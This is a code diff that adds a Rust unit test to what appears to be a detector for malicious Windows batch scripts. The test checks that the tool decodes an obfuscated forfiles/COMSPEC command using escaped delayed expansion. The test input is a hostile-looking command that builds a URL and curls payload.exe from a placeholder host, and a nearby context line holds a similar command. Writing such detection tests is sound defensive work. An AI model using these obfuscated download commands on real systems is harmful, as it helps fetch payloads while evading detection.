@@ -18929,6 +18929,24 @@ forfiles /m payload.txt /c "%COMSPEC% /V:ON /c set U=https://forfiles-escaped.ex
     }
 
     #[test]
+    fn forfiles_comspec_v_on_child_preserves_escaped_delayed_expansion() {
+        let script = br#"forfiles /m payload.txt /c "%COMSPEC% /V:ON /c set U=https://forfiles-von-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://forfiles-von-escaped.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "forfiles COMSPEC /V:ON child did not preserve escaped delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn forfiles_dot_root_placeholder_matches_current_directory_file() {
         let script = br#"echo seed>payload.txt
 forfiles /p . /m payload.txt /c "cmd /V:ON /c set U=https://forfiles-dot-root.example/@file&&curl -o @file !U!""#;
